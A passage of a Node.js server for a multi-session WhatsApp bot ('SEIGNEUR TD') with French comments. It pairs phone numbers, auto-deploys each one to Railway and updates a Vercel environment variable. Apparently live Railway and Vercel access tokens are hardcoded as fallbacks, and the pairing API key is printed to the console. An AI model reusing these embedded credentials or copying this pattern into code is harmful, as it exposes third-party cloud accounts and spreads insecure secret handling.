        console.log('[' + phone + '] 🗑️ Session supprimée (loggedOut)');
      } else if (currentStatus === 'connected') {
        activeSessions.delete(phone);
        console.log('[' + phone + '] 🔄 Déconnexion réseau — reconnexion silencieuse...');
        await delay(5000);
        await reconnectSession(phone);
      }
    }
  });

  sock.ev.on('creds.update', saveCreds);
  return formatted;
}

// ─── Déploiement automatique sur Railway ────────────────────────────────────
async function railwayGQL(token, query, variables = {}) {
  const res = await axios.post('https://backboard.railway.app/graphql/v2',
    { query, variables },
    { headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' }, timeout: 30000 }
  );
  if (res.data?.errors) throw new Error(res.data.errors[0]?.message || 'GraphQL error');
  return res.data?.data;
}

async function deployToRailway(phone, sessionString) {
  const RAILWAY_TOKEN = config.railwayToken || process.env.RAILWAY_TOKEN || '96bac1f1-b737-4cb0-b8c7-d8af5a4a0b0a';
  const GITHUB_REPO = 'Azountou235/SEIGNEUR-TD-';
  try {
    console.log('[RAILWAY] Déploiement pour ' + phone + '...');

    // 1. Créer le projet
    const p = await railwayGQL(RAILWAY_TOKEN,
      'mutation CreateProject($name: String!) { projectCreate(input: { name: $name, defaultEnvironmentName: "production" }) { id name } }',
      { name: 'seigneur-td-' + phone }
    );
    const projectId = p?.projectCreate?.id;
    if (!projectId) throw new Error('Impossible de créer le projet Railway');
    console.log('[RAILWAY] Projet: ' + projectId);

    // 2. Récupérer l'environment
    const e = await railwayGQL(RAILWAY_TOKEN,
      'query GetEnv($id: String!) { project(id: $id) { environments { edges { node { id name } } } } }',
      { id: projectId }
    );
    const envId = e?.project?.environments?.edges?.[0]?.node?.id;
    if (!envId) throw new Error('Environment Railway introuvable');

    // 3. Créer le service (sans source GitHub)
    const s = await railwayGQL(RAILWAY_TOKEN,
      'mutation CreateService($projectId: String!, $name: String!) { serviceCreate(input: { projectId: $projectId, name: $name }) { id } }',
      { projectId, name: 'bot-' + phone }
    );
    const serviceId = s?.serviceCreate?.id;
    if (!serviceId) throw new Error('Impossible de créer le service Railway');
    console.log('[RAILWAY] Service: ' + serviceId);

    // 4. Connecter GitHub au service
    await railwayGQL(RAILWAY_TOKEN,
      'mutation ConnectGithub($id: String!, $repo: String!, $branch: String!) { serviceConnect(id: $id, input: { source: { repo: $repo, branch: $branch } }) { id } }',
      { id: serviceId, repo: GITHUB_REPO, branch: 'main' }
    ).catch(async () => {
      // Fallback: utiliser serviceInstanceUpdate
      await railwayGQL(RAILWAY_TOKEN,
        'mutation UpdateInstance($serviceId: String!, $envId: String!, $repo: String!) { serviceInstanceUpdate(serviceId: $serviceId, environmentId: $envId, input: { source: { repo: $repo, branch: "main" } }) }',
        { serviceId, envId, repo: GITHUB_REPO }
      );
    });

    // 5. Variables d'environnement
    await railwayGQL(RAILWAY_TOKEN,
      'mutation SetVars($projectId: String!, $envId: String!, $serviceId: String!, $vars: Json!) { variableCollectionUpsert(input: { projectId: $projectId, environmentId: $envId, serviceId: $serviceId, variables: $vars }) }',
      { projectId, envId, serviceId, vars: { SESSION_ID: sessionString, OWNER_NUMBER: phone, BOT_NAME: 'SEIGNEUR TD' } }
    );

    // 6. Déclencher le déploiement
    await railwayGQL(RAILWAY_TOKEN,
      'mutation Deploy($serviceId: String!, $envId: String!) { serviceInstanceDeploy(serviceId: $serviceId, environmentId: $envId) }',
      { serviceId, envId }
    ).catch(() => console.log('[RAILWAY] Deploy déclenché (ou déjà en cours)'));

    console.log('[RAILWAY] ✅ Déployé pour ' + phone);
    return { success: true, projectId, serviceId };
  } catch(e) {
    console.error('[RAILWAY] Erreur:', e.message);
    return { success: false, error: e.message };
  }
}

// ─── Serveur HTTP API — Compatible Lovable ────────────────────────────────────
createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-api-key, X-Secret');
  res.setHeader('Content-Type', 'application/json');

  if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }

  // Parser le body JSON
  let body = {};
  if (req.method === 'POST') {
    body = await new Promise((resolve) => {
      let data = '';
      req.on('data', chunk => data += chunk);
      req.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve({}); } });
    });
  }

  const url = req.url?.split('?')[0];

  // ── GET /health — pas besoin de clé API ──────────────────────────────
  if (req.method === 'GET' && url === '/health') {
    res.writeHead(200); res.end(JSON.stringify({ status: 'online', bot: config.botName, sessions: activeSessions.size })); return;
  }

  // Vérification clé API pour toutes les autres routes
  const apiKey = req.headers['x-api-key'] || req.headers['x-secret'];
  if (apiKey !== PAIRING_SECRET) {
    res.writeHead(401); res.end(JSON.stringify({ error: 'Clé API invalide' })); return;
  }

  // ── POST /api/connect — Demande de connexion (route principale Lovable) ──
  if (req.method === 'POST' && (url === '/api/connect' || url === '/pair')) {
    const phone = body.phone?.replace(/\D/g, '');
    if (!phone || phone.length < 7) { res.writeHead(400); res.end(JSON.stringify({ error: 'Numéro invalide' })); return; }

    if (activeSessions.has(phone)) {
      const existing = activeSessions.get(phone);
      if (existing.status === 'connected') {
        res.writeHead(200); res.end(JSON.stringify({ status: 'already_connected', phone })); return;
      }
      if (existing.pairingCode) {
        res.writeHead(200); res.end(JSON.stringify({ status: 'pending', pairingCode: existing.pairingCode, phone })); return;
      }
      try { existing.sock?.ws?.close(); } catch {}
      // Garder les credentials si déjà présents
      if (!sessionHasCredentials(phone)) {
        try { fs.rmSync('./sessions/' + phone, { recursive: true, force: true }); } catch {}
      }
      activeSessions.delete(phone);
    }

    try {
      console.log('[API] Nouvelle session pour: ' + phone);
      const pairingCode = await createUserSession(phone);
      res.writeHead(200); res.end(JSON.stringify({ status: 'pending', pairingCode, phone }));
    } catch(e) {
      console.error('[API] Erreur création session:', e.message);
      res.writeHead(500); res.end(JSON.stringify({ error: e.message }));
    }
    return;
  }

  // ── GET /api/status?phone=xxx — Statut d'une session ─────────────────
  if (req.method === 'GET' && (url === '/api/status' || url === '/status')) {
    const phone = req.url?.split('phone=')[1]?.replace(/\D/g, '');
    if (!phone) { res.writeHead(400); res.end(JSON.stringify({ error: 'Paramètre phone manquant' })); return; }
    const session = activeSessions.get(phone);
    if (!session) { res.writeHead(200); res.end(JSON.stringify({ status: 'not_found', phone })); return; }
    res.writeHead(200); res.end(JSON.stringify({
      status: session.status,
      phone,
      pairingCode: session.pairingCode || null,
      connectedAt: session.connectedAt || null
    }));
    return;
  }

  // ── GET /api/sessions — Liste toutes les sessions actives ─────────────
  if (req.method === 'GET' && url === '/api/sessions') {
    const list = [];
    for (const [phone, session] of activeSessions) {
      list.push({ phone, status: session.status, connectedAt: session.connectedAt || null });
    }
    res.writeHead(200); res.end(JSON.stringify({ sessions: list, count: list.length })); return;
  }

  // ── POST /api/disconnect — Déconnecter une session ────────────────────
  if (req.method === 'POST' && url === '/api/disconnect') {
    const phone = body.phone?.replace(/\D/g, '');
    const session = activeSessions.get(phone);
    if (session?.sock) {
      try { await session.sock.logout(); } catch {}
      activeSessions.delete(phone);
    }
    res.writeHead(200); res.end(JSON.stringify({ status: 'disconnected', phone })); return;
  }

  res.writeHead(404); res.end(JSON.stringify({ error: 'Route non trouvée' }));
}).listen(PAIRING_PORT, () => {
  console.log('[API] Serveur en ligne sur port ' + PAIRING_PORT);
  console.log('[API] Clé: ' + PAIRING_SECRET);
});

// ─── Mise à jour automatique BOT_URL sur Vercel ──────────────────────────────
async function updateVercelEnv(newUrl) {
  const VERCEL_TOKEN      = process.env.VERCEL_TOKEN || 'vcp_17K2l1zVnOGZypei3ngYAJvdwjoBb7wcocROos921yjBcMJzRx0aYXRR';
  const VERCEL_PROJECT_ID = process.env.VERCEL_PROJECT_ID || 'prj_1ocACI1X4TkMN0XtqzEUhwQifymq';

  if (VERCEL_TOKEN === 'METS_TON_TOKEN_ICI') {
    console.log('[VERCEL] ⚠️ VERCEL_TOKEN non configuré — mets à jour BOT_URL manuellement: ' + newUrl);
    return;
  }

  try {
    console.log('[VERCEL] Mise à jour BOT_URL → ' + newUrl + '...');

    // Supprimer l'ancienne variable BOT_URL
    await axios.delete('https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env/BOT_URL', {
      headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN }
    }).catch(() => {});

    // Récupérer la liste des variables pour trouver l'ID de BOT_URL
    const listRes = await axios.get('https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env', {
      headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN }
    });

    const envVars = listRes.data?.envs || [];
    const botUrlVar = envVars.find(e => e.key === 'BOT_URL');

    if (botUrlVar) {
      // Mettre à jour la variable existante
      await axios.patch(
        'https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env/' + botUrlVar.id,
        { value: newUrl, target: ['production', 'preview', 'development'] },
        { headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN, 'Content-Type': 'application/json' } }
      );
    } else {
      // Créer la variable
      await axios.post(
        'https://api.vercel.com/v9/projects/' + VERCEL_PROJECT_ID + '/env',
        { key: 'BOT_URL', value: newUrl, type: 'plain', target: ['production', 'preview', 'development'] },
        { headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN, 'Content-Type': 'application/json' } }
      );
    }

    // Redéployer Vercel pour appliquer la nouvelle variable
    await axios.post(
      'https://api.vercel.com/v13/deployments',
      { name: 'seigneur-td-pair', gitSource: { type: 'github', repoId: VERCEL_PROJECT_ID, ref: 'main' } },
      { headers: { 'Authorization': 'Bearer ' + VERCEL_TOKEN, 'Content-Type': 'application/json' } }
    ).catch(() => {});

    console.log('[VERCEL] ✅ BOT_URL mis à jour: ' + newUrl);
  } catch(e) {
    console.log('[VERCEL] ❌ Erreur mise à jour:', e.message);
    console.log('[VERCEL] → Mets à jour BOT_URL manuellement: ' + newUrl);
  }
}

// ─── Démarrage : autoPull → connectToWhatsApp → restoreWebSessions ───────────
// Bot principal désactivé — seules les sessions connectées via le site fonctionnent
restoreWebSessions().catch(e => console.log('[RESTORE] Erreur globale:', e.message));

// ─── Watchdog global — vérifie toutes les 3 min que les sessions sont vivantes ─
setInterval(async () => {
  for (const [phone, session] of activeSessions) {
    if (session.status !== 'connected') continue;
    const sock = session.sock;
    if (!sock) continue;
    // Vérifier si le WebSocket est toujours ouvert
    const wsState = sock.ws?.readyState;
    // readyState: 0=CONNECTING 1=OPEN 2=CLOSING 3=CLOSED
    if (wsState !== undefined && wsState !== 1) {
      console.log('[WATCHDOG] ⚠️ ' + phone + ' — WS fermé (state=' + wsState + '), reconnexion...');
      activeSessions.delete(phone);
      await reconnectSession(phone).catch(e => console.log('[WATCHDOG] Erreur:', e.message));
    } else {
      // Mettre à jour le timestamp du dernier ping
      session._lastPing = Date.now();
    }
  }
}, 3 * 60 * 1000);


process.on('SIGINT', () => {
  console.log('\n\n👋 Bot shutting down...');
  saveData();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\n\n🛑 SIGTERM reçu — arrêt propre...');
  saveData();
  process.exit(0);
});

process.on('uncaughtException', (err) => {
  console.error('[ERREUR NON CAPTURÉE] Le bot continue:', err?.message || err);
  try { saveData(); } catch(e) {}
  // Ne pas exit — le bot continue de tourner
});

process.on('unhandledRejection', (reason) => {
  console.error('[PROMESSE REJETÉE] Le bot continue:', reason?.message || reason);
  // Ne pas exit — le bot continue de tourner
});
